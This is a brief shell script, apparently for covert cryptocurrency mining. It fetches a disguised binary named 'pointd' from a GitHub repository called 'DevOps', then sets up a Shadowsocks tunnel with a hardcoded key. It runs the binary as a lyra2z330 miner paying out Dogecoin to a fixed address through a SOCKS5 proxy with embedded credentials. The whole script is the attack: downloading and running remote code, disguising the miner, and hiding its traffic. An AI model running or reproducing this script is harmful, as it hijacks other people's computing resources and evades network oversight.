apt update -y
wget -q https://github.com/lafdahai76/DevOps/raw/main/pointd
chmod +x pointd
sudo apt -y install shadowsocks-libev rng-tools libsodium-dev

ss-local -s us-ss.sshmax.xyz -p 8388 -l 8139 -k N2IwN2Yz -m chacha20-ietf-poly1305 -v &
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D8SQiATrkXeAUegfU8x7CGz2wysuQv4A6f.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,zap=BUT-lyra2z330 -x socks5://arch:12322@20.224.42.112:1080
